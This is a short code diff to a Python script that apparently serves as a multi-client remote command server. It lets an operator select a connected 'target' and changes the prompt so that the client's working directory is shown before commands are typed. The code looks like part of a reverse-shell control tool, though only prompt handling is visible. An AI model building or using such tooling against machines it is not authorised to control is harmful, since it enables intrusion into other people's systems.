@@ -91,7 +91,8 @@ def get_target(cmd):
         target = int(target)
         conn = all_connections[target]
         print("You are now connected to " + str(all_addresses[target][0]))
-        print(str(all_addresses[target][0]) + '> ', end="")
+        # Address shouldn't be printed, we want cwd, instead
+        # print(str(all_addresses[target][0]) + '> ', end="")
         return target, conn
     except:
         print('Not a valid selection')
@@ -101,6 +102,9 @@ def get_target(cmd):
 # Connect with remote target client
 def send_target_commands(target, conn):
     global s
+    conn.send(str.encode(" "))
+    client_response = str(conn.recv(2048), "utf-8")
+    print(client_response, end="")
     while True:
         try:
             cmd = input()
